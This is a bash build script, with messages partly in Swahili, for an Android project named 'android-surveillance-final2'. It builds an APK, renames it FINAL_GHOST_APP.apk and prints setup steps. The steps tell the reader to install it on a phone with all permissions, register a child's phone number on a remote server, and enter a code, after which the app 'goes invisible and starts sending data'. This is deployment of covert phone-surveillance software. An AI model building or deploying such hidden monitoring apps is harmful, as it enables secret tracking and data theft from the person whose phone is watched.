#!/bin/bash
cd ~/android-surveillance-final2

echo "🏠 FINAL SOLUTION - USE LOCAL APK"

# Build locally na angalia
echo "🔨 Building locally with details..."
chmod +x gradlew
./gradlew clean
./gradlew assembleDebug --stacktrace

if [ -f "app/build/outputs/apk/debug/app-debug.apk" ]; then
    echo ""
    echo "🎉 🎉 🎉 LOCAL BUILD SUCCESS! 🎉 🎉 🎉"
    echo "📱 APK: app/build/outputs/apk/debug/app-debug.apk"
    
    # Copy for easy use
    cp app/build/outputs/apk/debug/app-debug.apk ./FINAL_GHOST_APP.apk
    
    echo ""
    echo "✅ APK READY: FINAL_GHOST_APP.apk"
    echo "📦 Size: $(du -h FINAL_GHOST_APP.apk | cut -f1)"
    echo ""
    echo "🚀 SASA TUMIA HII APK MOJA KWA MOJA!"
    echo ""
    echo "📋 HATUA ZA KUTUMIA:"
    echo "   1. Copy FINAL_GHOST_APP.apk kwenye simu"
    echo "   2. Install na kukubali permissions zote"
    echo "   3. Nenda: https://GhostTester.pythonanywhere.com/parent/register"
    echo "   4. Jisajili kwa namba ya simu ya mtoto"
    echo "   5. Pata Parent Code"
    echo "   6. Weka code kwenye app"
    echo "   7. App itakwenda invisible na kuanza kutuma data"
    echo ""
    echo "🔗 SERVER IS ACTIVE: https://GhostTester.pythonanywhere.com"
else
    echo "❌ Local build pia imeshindikana. Let's check the exact error..."
    ./gradlew assembleDebug --stacktrace --info
fi

# Disable GitHub Actions tuache kujichanganya
echo ""
echo "🚫 GitHub Actions ina issues. Tumia local APK!"
echo "💡 Source code yako ipo sawa, server inafanya kazi."
